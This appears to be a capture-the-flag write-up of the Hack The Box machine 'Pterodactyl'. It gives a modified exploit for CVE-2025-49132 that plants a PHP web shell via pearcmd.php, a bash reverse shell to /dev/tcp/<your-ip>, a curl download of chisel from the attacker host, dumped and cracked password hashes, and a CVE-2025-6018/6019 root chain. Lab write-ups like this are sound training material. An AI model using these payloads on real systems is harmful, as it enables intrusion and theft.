---
layout: post
title: "Pterodactyl (Medium) - HTB writeup"
---

# Introduction
Pterodactyl is a medium linux machine. During enumeration we find a vhost that hosts an outdated version of Pterodactyl Panel vulnerable to RCE. We exploit it and get a shell. Then we read user password hash from mysql database using credentials found in .env file. After cracking it we can ssh into the user account.
\
Root requires chaining two exploits for CVE-2025-6018 and CVE-2025-6019 which will escalate our privileges.

# USER

We see that only ssh and web ports are open.

```bash
$ sudo nmap -sV -sC -p- -A -T4 -v pterodactyl.htb -o nmap/tcp
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 9.6 (protocol 2.0)
| ssh-hostkey: 
|   256 a3:74:1e:a3:ad:02:14:01:00:e6:ab:b4:18:84:16:e0 (ECDSA)
|_  256 65:c8:33:17:7a:d6:52:3d:63:c3:e4:a9:60:64:2d:cc (ED25519)
80/tcp   open   http       nginx 1.21.5
|_http-title: My Minecraft Server
|_http-server-header: nginx/1.21.5
| http-methods: 
|_  Supported Methods: GET HEAD POST

```
\
Website only contains the landing page and /changelog.txt which gives us some info, most importantly:
```
[Linked] Subdomain Configuration
--------------------------------
- Added DNS and reverse proxy routing for play.pterodactyl.htb.
- Configured NGINX virtual host for subdomain forwarding.

[Installed] Pterodactyl Panel v1.11.10
--------------------------------------
- Installed Pterodactyl Panel.
- Configured environment:
  - PHP with required extensions.
  - MariaDB 11.8.3 backend.

[Enhanced] PHP Capabilities
-------------------------------------
- Enabled PHP-FPM for smoother website handling on all domains.
- Enabled PHP-PEAR for PHP package management.
- Added temporary PHP debugging via phpinfo()
```

\
We know that vhosts are configured so that's the first thing we'll enumerate.
```bash
$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.pterodactyl.htb" -u http://pterodactyl.htb -fc 302

panel                   [Status: 200, Size: 1897, Words: 490, Lines: 36, Duration: 413ms]

```
\
There's a panel subdomain available. After adding it to vhosts and visiting it we are met with Pterodactyl Panel login page. \
\
![login_page.png]({{site.url}}/images/pterodactyl/login_page.png)
\
\
We know that the version is v.1.11.10 from the changelog.txt file. After searching for vulnerabilities I found [CVE-2025-49132](https://nvd.nist.gov/vuln/detail/cve-2025-49132) which allows for remote code execution.
\
This vulnerability allows us to read and execute php files by sending requests to /locales/locale.json with locale and namespace parameters. For example a request to:

```
http://panel.pterodactyl.htb/locales/locale.json?locale=../../config&namespace=database
```
\
will give us contents of database.php where username and password for the database is stored.

![db_request.png]({{site.url}}/images/pterodactyl/db_request.png)

\
That's cool but we want to execute commands, so we have to create our own php file on the server. In the changelog.txt we saw earlier there's a note saying that PHP-PEAR is enabled. We can use this to create files using the pearcmd.php.
\
I found this PoC from which we will take inspiration and build our own payload [PoC](https://github.com/GRodolphe/CVE-2025-49132_poc). \
Let's take a look at these lines:
```python
base_url = f"http://{target_host}/locales/locale.json"
php_payload = f"/<?=system('{processed_command}')?>+/tmp/payload.php"
create_url = f"{base_url}?+config-create+/&locale=../../../../../usr/local/lib/php&namespace=pearcmd&{quote_plus(php_payload)}"
```

The first issue here is ```/usr/local/lib/php```. \
If we take a look at ```http://pterodactyl.htb/phpinfo.php``` we can see that the include_path contains ```/usr/share/php/PEAR``` which means pearcmd.php is also in that directory so let's change it. 
\
Next up is the php_payload. I'll change the payload so that it fetches the command from GET paramters and executes it whenever we go to payload.php. Our php_payload will become:
```python
php_payload = f"/<?=die(system($_GET['cmd']))?>+payload.php"
```
\
Notice how I also changed ```/tmp/payload.php``` to ```payload.php```. That is because we want to create the php file inside the current directory so we can easily send GET requests with cmd parameter to ```http://panel.pterodactyl.htb/payload.php``` instead of relying on the LFI vulnerability.
\
Last thing is removing ```{quote_plus(php_payload)}``` and using just ```{php_payload}``` because url encoding seems to break pearcmd's argument parsing.
\
This is how the modified PoC's exploit function should look like
```python
def exploit(target_host):
    """Execute the CVE-2025-49132 exploit."""
    
    try:
        # create payload file 
        base_url = f"http://{target_host}/locales/locale.json"
        php_payload = f"/<?=die(system($_GET['cmd']))?>+payload.php"
        create_url = f"{base_url}?+config-create+/&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&{php_payload}"
        
        print(f"[+] Creating payload on {target_host}...")
        response1 = requests.get(create_url, timeout=10)
        
        if response1.status_code != 200:
            print(f"[!] Warning: First request returned status {response1.status_code}")
        
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        sys.exit(1)
```
\
After we run the exploit, the file still isn't created. Let's capture the request in burp.
```
GET /locales/locale.json?+config-create+/&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/%3C?=die(system($_GET%5B'cmd'%5D))?%3E+payload.php
```
\
It seems like some of the characters are encoded. I'm not sure how can you disable this encoding in python so I'll just decode them in burp and forward the request:
```
GET /locales/locale.json?+config-create+/&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=die(system($_GET['cmd']))?>+payload.php
```

Now we go to ```http://panel.pterodactyl.htb/payload.php?cmd=id``` and in the response we see that our command worked.
\
\
Time to establish a foothold. I'll just use this url encoded bash revshell:
```
http://panel.pterodactyl.htb/payload.php?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<your-ip>%2F<port>%200%3E%261
```
\
After executing it we get a shell:
```
$ nc -lvnp 4444
listening on [any] 4444 ...
wwwrun@pterodactyl:/var/www/pterodactyl/public> 
```
\
We know that there is a mysql database "panel" with credentials ```pterodactyl:PteraPanel```. Unfortunetaly I wasn't able to properly interact with the database from this reverse shell. Instead I'll create a reverse tunnel with chisel so I can access it from my machine.

First host a simple python http server with chisel binary in your current directory:
```
python3 -m http.server 80
```

On victim machine:
```
curl http://<your-ip>/chisel -o chisel
chmod +x chisel
```

Now we start a server that will listen for connections on our machine
```
./chisel server -p 9999 --reverse
```

And on victim:
```
./chisel client 10.10.15.153:9999 R:3306:127.0.0.1:3306
```

Now we can access the database.
```
mysql -u pterodactyl -P 3306 -D panel -p
Enter password: PteraPanel

MariaDB [panel]> select * from users;

|  2 | NULL        | 5e6d956e-7be9-41ec-8016-45e434de8420 | headmonitor  | headmonitor@pterodactyl.htb  | Head       | Monitor   | $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2 
|  3 | NULL        | ac7ba5c2-6fd8-4600-aeb6-f15a3906982b | phileasfogg3 | phileasfogg3@pterodactyl.htb | Phileas    | Fogg      | $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi 
```

\
Inside we find 2 hashes. I'll try to crack the hash for phileasfogg3

```
hashcat -m 3200 hash ~/Downloads/rockyou.txt

$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi:!QAZ2wsx
```
\
Nice we have the password. And we can ssh in as phileasfogg3
```
phileasfogg3@pterodactyl:~> id
uid=1002(phileasfogg3) gid=100(users) groups=100(users)
```

# ROOT

After some enumeration I found a mail in /var/mail
\
It talks about some suspicious activity found in udisks daemon. It might hint onto a CVE being exploited in udiskd.
\
Quick google search gives us [this](https://ubuntu.com/blog/udisks-libblockdev-lpe-vulnerability-fixes-available) blog post that talks about two vulnerabilities: CVE-2025-6018 and CVE-2025-6019 being used in an exploit chain to achieve privilege escalation.\
We can use the former to get privileges of physical (console) allow_active user which are needed to exploit CVE-2025-6019.\
I'll use these PoCs:\
[CVE-2025-6018](https://github.com/ibrahmsql/CVE-2025-6018)
\
[CVE-2025-6019](https://github.com/guinea-offensive-security/CVE-2025-6019)

Let's try the first PoC

```
$ python3 CVE-2025-6018.py -i pterodactyl.htb -u phileasfogg3 -p '!QAZ2wsx'
...
2026-02-14 18:35:23 [INFO] EXPLOITATION SUCCESSFUL - Privilege escalation confirmed
2026-02-14 18:35:23 [INFO] Starting interactive shell session

--- Interactive Shell ---
Commands: 'exit' to quit, 'status' for privilege check
exploit$ status
```

And it worked, which means we now have privileges of a console user which will allow us to mount filesystems (needed by CVE-2025-6019)

Onto the next PoC
\
We must first run it on our attacker machine, as it will create an XFS image which we will then transfer to the victim.
```
$ sudo ./exploit.sh
[sudo] password for sausig: 
PoC for CVE-2025-6019 (LPE via libblockdev/udisks)
WARNING: Only run this on authorized systems. Unauthorized use is illegal.
Continue? [y/N]: y
...
Select mode:
[L]ocal: Create 300 MB XFS image (requires root)
[C]ible: Exploit target system
[L]ocal or [C]ible? (L/C): L
[*] Creating a 300 MB XFS image on local machine...
...
[+] 300 MB XFS image created: ./xfs.image
[*] Transfer to target with: scp xfs.image <user>@<host>:

```
\
Now transfer both the exploit and image file to the box with scp:
```
scp xfs.image phileasfogg3@pterodactyl.htb:
scp exploit.sh phileasfogg3@pterodactyl.htb:
``` 
\
And on the interactive shell we got from the previous exploit:
```
exploit$ exploit$ ./exploit.sh
./exploit.sh
PoC for CVE-2025-6019 (LPE via libblockdev/udisks)
WARNING: Only run this on authorized systems. Unauthorized use is illegal.
Continue? [y/N]: exploit$ y
y
[-] Error: Required tool 'mkfs.xfs' is not installed.
```
\
Whoops, we also need to copy mkfs.xfs to the machine
```
$ cp /usr/sbin/mkfs.xfs .
$ scp mkfs.xfs phileasfogg3@pterodactyl.htb:
```
\
Move it to bin directory and run the exploit again
```
exploit$ mv mkfs.xfs bin
exploit$ exploit$ ./exploit.sh
./exploit.sh
WARNING: Only run this on authorized systems. Unauthorized use is illegal.
Continue? [y/N]: exploit$ y
y

Select mode:
[L]ocal: Create 300 MB XFS image (requires root)
[C]ible: Exploit target system
[L]ocal or [C]ible? (L/C): exploit$ C
...
[*] Resizing filesystem to trigger mount...
[+] Mount successful (expected error: target is busy).
[*] Waiting 2 seconds for mount to stabilize...
[*] Checking for SUID bash in /tmp/blockdev*...
[+] SUID bash found: /tmp/blockdev.XMT4K3/bash
-rwsr-xr-x 1 root root 1380656 Feb 14 19:39 /tmp/blockdev.XMT4K3/bash
[*] Executing root shell...
bash-5.3# id
uid=1002(phileasfogg3) gid=100(users) euid=0(root) groups=100(users)

```
Boom, now we can retrieve the root.txt flag.

Thanks for reading my writeup!
